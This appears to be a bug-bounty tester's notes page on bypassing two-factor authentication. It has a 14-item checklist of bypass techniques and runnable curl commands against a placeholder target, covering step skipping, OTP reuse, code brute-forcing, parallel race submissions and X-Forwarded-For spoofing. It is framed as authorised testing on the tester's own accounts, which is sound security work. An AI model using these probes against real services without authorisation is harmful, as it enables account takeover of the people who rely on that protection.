# Moraa — 2FA / MFA bypass

> HackTricks `2fa-bypass`. Cross-ref [[auth-oauth]] (step-up/L2 gaps — we've CONFIRMED two of these
> on real programs: MFA policy-rule bypass + SSO L2 security-field bypass), [[race-condition]], [[csrf]].

## The checklist (run every one — MFA is usually bolted on, not baked in)
| # | Test | Wins when |
|---|---|---|
| 1 | **Skip the MFA step entirely** — after step-1 login (correct password), call the post-login/dashboard/API endpoint directly instead of following the redirect to the OTP page | server sets the session as authenticated at step 1, MFA is only a UI gate |
| 2 | **Response/status manipulation** | client-side JS decides "MFA passed" from a flag in the response — intercept and flip `false→true` / `mfa_required:false` before the JS reads it |
| 3 | **Session transplant** | complete MFA on account A's session, then swap the resulting "verified" cookie/token onto a session that never did step 1/2 |
| 4 | **OTP reuse / cross-account** | does a code generated for account A validate on account B? Replay a used code. |
| 5 | **No rate limit on OTP verify** | brute the 4-8 digit code (10⁴-10⁶ space) if no lockout/backoff — script it, watch for a resend-resets-the-counter bug too |
| 6 | **Resend-resets-limit** | hitting "resend code" clears the failed-attempt counter → infinite brute budget |
| 7 | **Race condition on verify** | fire the SAME correct/guessed code N times in parallel — a non-atomic check can let more than one "single-use" validation through, or let a brute attempt land between rate-limit updates |
| 8 | **Backup codes exposure** | are backup codes readable via an IDOR, a CORS-leaky endpoint, or an XSS elsewhere in the account settings page? |
| 9 | **Legacy/mobile/partner API version** | `/v1/login` or a mobile-app endpoint that predates MFA enforcement — same class as the API-version IDOR gap |
| 10 | **CSRF on disable-2FA** | if disabling MFA is a simple state-changing POST with no re-auth, CSRF it ([[csrf]]) |
| 11 | **Downgrade to a weaker factor** | can the flow be steered to SMS/email OTP (interceptable) instead of TOTP/hardware key? |
| 12 | **OAuth/SSO federation bypass** | does logging in via "Sign in with Google/SSO" skip the app's own MFA requirement entirely? |
| 13 | **"Remember this device" cookie** | is it a predictable value, or does it not actually bind to device fingerprint/IP, letting you set it manually? |
| 14 | **IP/header spoof** | some "trust this network" logic trusts `X-Forwarded-For` — spoof to an allowlisted range |

## Runnable checks (commands for the checklist above)

```bash
H="https://TARGET"
PARTIAL="session=<cookie-from-step-1-only>"   # password accepted, OTP NOT yet completed

# 1 — SKIP the step: does a post-login endpoint trust the partial session?
#     200 + real account data = win; 302/401 back to the OTP page = enforced.
curl -s -i "$H/api/v2/me" -H "Cookie: $PARTIAL" | head -15

# 2 — response manipulation: find the flag the client JS reads, flip it server-side
curl -s "$H/api/v2/login" -H 'Content-Type: application/json' \
     -d '{"email":"me@you.test","password":"<correct>"}'          # note mfa_required / status field
# then replay step-2 with the flag flipped in the REQUEST where the API accepts it,
# or in Burp: intercept the RESPONSE to the OTP check and flip "mfa_passed": false -> true.

# 4 — OTP reuse / cross-account: replay a code you already consumed
for cookie in "$PARTIAL" "$PARTIAL_B"; do
  curl -s -o /dev/null -w '%{http_code} ' "$H/api/v2/mfa/verify" -H "Cookie: $cookie" \
       -H 'Content-Type: application/json' -d '{"code":"<already-used-code>"}'
done; echo   # a 200 on a spent code = reuse bug

# 5+6 — backoff probe: 15 rapid WRONG codes. Any 429/lockout? Then hit resend and repeat —
#       if the counter reset, the resend is the brute-budget bug.
for c in 000000 000001 000002 000003 000004 000005 000006 000007 000008 000009 000010 000011 000012 000013 000014; do
  curl -s -o /dev/null -w "$c %{http_code}\n" "$H/api/v2/mfa/verify" -H "Cookie: $PARTIAL" \
       -H 'Content-Type: application/json' -d "{\"code\":\"$c\"}"
done

# 7 — race on verify: 20 parallel submits of the same code (non-atomic check lets >1 through)
seq 1 20 | xargs -P20 -I{} curl -s -o /dev/null -w '%{http_code} ' \
  "$H/api/v2/mfa/verify" -H "Cookie: $PARTIAL" -H 'Content-Type: application/json' \
  -d '{"code":"123456"}'; echo

# 9 — legacy/mobile/partner API versions that predate MFA enforcement
for v in v1 v2 v3 internal mobile-api; do
  curl -s -o /dev/null -w "$v %{http_code}\n" "$H/api/$v/account" -H "Cookie: $PARTIAL"
done

# 14 — IP/header trust: does the allowlist logic believe X-Forwarded-For?
curl -s -o /dev/null -w '%{http_code}\n' "$H/api/v2/mfa/verify" -H "Cookie: $PARTIAL" \
     -H 'X-Forwarded-For: 127.0.0.1' -H 'Content-Type: application/json' -d '{"code":"123456"}'
```

**Impact gate per check:** #1 counts only if the partial session returns *real account data*
(not a redirect to the OTP page). #5 counts only if you complete a real code guess within the
observed budget — on your OWN test account, never a victim's. #7 counts only if ≥2 parallel
requests return success for a single-use code. A step that "can be skipped" but gates every
sensitive action behind step-up anyway is a shrug, not an ATO.

## Our confirmed pattern: step-up/L2 gaps are usually PER-FIELD, not systemic

Two live findings this way: an MFA-policy-rule engine and an SSO "L2" step-up both had the SAME shape
— step-up correctly required on most sensitive actions/fields, but **one field/rule in the set was
missed**. Method: enumerate EVERY security-sensitive action a step-up flow is supposed to gate
(password change, email change, recovery-phone change, MFA reset toggle, API-key creation, session
list revoke) and test each independently for the step-up requirement — don't assume coverage from one
positive test. See `sso-stepup-bypass-security-fields.md`/`mfa-stepup-bypass-policy-rules.md` for the pattern.

## Report
State exactly which check (1-14) failed, whether it requires an already-compromised password (lowers
severity — many programs downgrade "assumes attacker already has creds" bugs), and the concrete
account-takeover chain from that gap.
